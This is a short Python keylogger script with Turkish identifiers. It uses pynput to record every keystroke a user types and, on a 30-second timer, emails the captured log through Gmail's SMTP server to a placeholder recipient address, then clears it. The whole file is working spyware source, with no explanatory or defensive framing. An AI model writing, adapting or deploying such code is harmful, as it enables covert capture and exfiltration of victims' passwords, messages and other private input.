from pynput import keyboard
import smtplib
import threading

log = ""

def cagirici(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        elif key == key.enter:
            log = log + str(key)
    except:
        pass

    print(log)

def mail_gonder(mesaj):
    mail_sunucu = smtplib.SMTP("smtp.gmail.com",587)
    mail_sunucu.starttls()
    mail_sunucu.login("gönderen_mail_adresi","şifre")
    mail_sunucu.sendmail("gönderen_mail","alici_mail",mesaj)
    mail_sunucu.quit()

dinleyici = keyboard.Listener(on_press=cagirici)

def paralel_fonk():
    global log
    mail_gonder(log.encode("utf-8"))
    log = ""
    timer_object = threading.Timer(30, paralel_fonk)
    timer_object.start()

with dinleyici:
    paralel_fonk()
    dinleyici.join()
